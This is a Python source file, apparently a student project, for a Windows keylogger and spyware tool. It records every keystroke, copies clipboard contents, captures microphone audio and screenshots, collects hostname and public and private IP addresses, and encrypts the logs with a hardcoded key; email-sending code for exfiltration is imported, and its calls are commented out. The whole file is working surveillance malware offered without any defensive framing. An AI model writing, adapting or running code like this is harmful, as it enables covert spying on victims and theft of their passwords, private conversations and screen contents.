
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import process, freeze_support
from PIL import ImageGrab


keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "enc_key_log.txt"
system_information_e = "enc_systeminfo.txt"
clipboard_information_e = "enc_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end =3

key="TXVJkGQ50pJpSB25aQmUk7paTyVGYbYMIW_Y4udzl7Q="

file_path = "C:\\Users\\hp\\PycharmProjects\\keylogger_css\\project"
extend = "\\"
file_merge = file_path + extend

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP ADDRESS :" + public_ip)

        except Exception:
            f.write("could not get public ip address (most likely max query")

        f.write("processor: " + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + "" + platform.version() + '\n')
        f.write("Machine:" + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("private ip address :" + IPAddr + "\n")
computer_information()

import win32clipboard

def copy_clipboard():
    # Assuming file_path, extend, and clipboard_information are defined elsewhere in your code
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + "\n")

        except Exception as e:
            f.write("Clipboard could not be copied: " + str(e) + "\n")

copy_clipboard()

import sounddevice as sd
from scipy.io.wavfile import write

def microphone():
    fs = 44100  # Sample rate
    seconds = microphone_time  # Duration of recording
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
try:
    while number_of_iterations < number_of_iterations_end:
        # Your keylogger code here
        count = 0
        keys = []

        def on_press(key):
            global keys, count, currentTime
            print(key)
            keys.append(key)
            count += 1
            currentTime = time.time()

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(file_path + extend + "keys_information.txt", "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                    elif k.find("keys") == -1:
                        f.write(k)

        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            with open(file_path + extend + keys_information, "w") as f:
                f.write(" ")
            screenshot()
            # send email(screenshot_information,file_path + extend + screenshot_information, toaddr)

            copy_clipboard()
            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

    files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]

    encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                             file_merge + keys_information_e]

    count = 0
    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_files_names[count], 'wb') as f:
            f.write(encrypted)

        # send_email(encrypted_files_names[count], encrypted_files_names[count], toaddr)
        # count +=1

        time.sleep(120)

except KeyboardInterrupt:
    print("Keyboard interrupt detected. Exiting THE KEYBOARD...")

